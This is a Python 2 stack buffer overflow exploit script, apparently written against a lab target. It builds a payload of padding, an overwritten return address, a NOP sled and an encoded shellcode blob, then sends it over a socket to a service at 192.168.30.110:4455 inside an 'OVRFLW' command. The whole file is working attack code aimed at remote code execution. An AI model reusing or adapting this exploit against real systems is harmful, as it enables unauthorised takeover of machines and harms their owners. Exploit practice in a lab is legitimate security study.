#!/usr/bin/env python
import socket,sys,time,struct

buf = 'A'*1493
eip=struct.pack("<I",0x56526683)
nops="\x90"*16
shell=("\x29\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x21\x2f\xfc\x63\x83\xee\xfc\xe2\xf4\xdd\xc7\x7e\x63\x21\x2f"
"\x9c\xea\xc4\x1e\x3c\x07\xaa\x7f\xcc\xe8\x73\x23\x77\x31\x35"
"\xa4\x8e\x4b\x2e\x98\xb6\x45\x10\xd0\x50\x5f\x40\x53\xfe\x4f"
"\x01\xee\x33\x6e\x20\xe8\x1e\x91\x73\x78\x77\x31\x31\xa4\xb6"
"\x5f\xaa\x63\xed\x1b\xc2\x67\xfd\xb2\x70\xa4\xa5\x43\x20\xfc"
"\x77\x2a\x39\xcc\xc6\x2a\xaa\x1b\x77\x62\xf7\x1e\x03\xcf\xe0"
"\xe0\xf1\x62\xe6\x17\x1c\x16\xd7\x2c\x81\x9b\x1a\x52\xd8\x16"
"\xc5\x77\x77\x3b\x05\x2e\x2f\x05\xaa\x23\xb7\xe8\x79\x33\xfd"
"\xb0\xaa\x2b\x77\x62\xf1\xa6\xb8\x47\x05\x74\xa7\x02\x78\x75"
"\xad\x9c\xc1\x70\xa3\x39\xaa\x3d\x17\xee\x7c\x47\xcf\x51\x21"
"\x2f\x94\x14\x52\x1d\xa3\x37\x49\x63\x8b\x45\x26\xd0\x29\xdb"
"\xb1\x2e\xfc\x63\x08\xeb\xa8\x33\x49\x06\x7c\x08\x21\xd0\x29"
"\x09\x29\x76\xac\x81\xdc\x6f\xac\x23\x71\x47\x16\x6c\xfe\xcf"
"\x03\xb6\xb6\x47\xfe\x63\x31\xbd\x75\x85\x4b\x3f\xaa\x34\x49"
"\xed\x27\x54\x46\xd0\x29\x34\x49\x98\x15\x5b\xde\xd0\x29\x34"
"\x49\x5b\x10\x58\xc0\xd0\x29\x34\xb6\x47\x89\x0d\x6c\x4e\x03"
"\xb6\x49\x4c\x91\x07\x21\xa6\x1f\x34\x76\x78\xcd\x95\x4b\x3d"
"\xa5\x35\xc3\xd2\x9a\xa4\x65\x0b\xc0\x62\x20\xa2\xb8\x47\x31"
"\xe9\xfc\x27\x75\x7f\xaa\x35\x77\x69\xaa\x2d\x77\x79\xaf\x35"
"\x49\x56\x30\x5c\xa7\xd0\x29\xea\xc1\x61\xaa\x25\xde\x1f\x94"
"\x6b\xa6\x32\x9c\x9c\xf4\x94\x1c\x7e\x0b\x25\x94\xc5\xb4\x92"
"\x61\x9c\xf4\x13\xfa\x1f\x2b\xaf\x07\x83\x54\x2a\x47\x24\x32"
"\x5d\x93\x09\x21\x7c\x03\xb6")

esp='C'*(3000-4-len(buf)-len(nops)-len(shell))
buffer=buf+eip+nops+shell+esp
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.30.110",4455))
buffer=("OVRFLW "+buffer+"\r\n")
s.send(buffer)
print "[+] sending exploit shell"
s.close()
